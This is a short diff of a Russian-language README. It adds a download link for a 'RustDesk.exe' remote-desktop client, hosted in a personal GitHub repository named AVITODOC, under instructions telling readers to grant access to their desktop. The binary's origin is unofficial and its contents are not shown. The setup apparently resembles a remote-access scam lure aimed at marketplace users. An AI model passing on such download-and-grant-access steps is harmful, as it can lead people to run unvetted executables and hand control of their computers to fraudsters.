@@ -26,9 +26,13 @@
 Чтобы предоставить доступ к вашему рабочему столу, выполните следующие действия:
 
 1. **Скачайте клиент*:
-windows(x86-32) -
+
+windows x86-32(https://github.com/AlexeiChuev/AVITODOC/releases/download/RUSTDESKBASE/RustDesk.exe)
+
 windows(x32) -
+
 Apple Silicon(m1-m4) -
+
 apple(intel i3-i7) -
 
 ## 🛠️ Техническая информация
